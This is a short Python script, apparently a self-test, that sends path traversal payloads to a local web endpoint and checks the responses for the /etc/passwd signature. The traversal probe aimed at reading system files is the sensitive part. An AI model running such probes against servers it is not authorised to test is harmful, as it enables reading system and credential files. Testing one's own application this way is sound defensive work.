import requests

# The URL of the webpage you're testing
url = 'http://127.0.0.1:5000/hospitality_staff_dashboard'

# A list of payloads to test
payloads = ['../', '../../', '../../../', '../../../../', '../../../../../']

user_input = input("Enter your input: ")
# Iterate over each payload
for payload in payloads:
    # Send the request to the URL with the payload as a parameter
    response = requests.get(url, params={'input': payload + user_input})
    # Print the response
    print(response.text)

    # If the payload is in the response, the application is vulnerable
    if 'root:x:0:0:' in response.text:
        print('The application is vulnerable to path traversal')
    else:
        print('The application is not vulnerable to path traversal')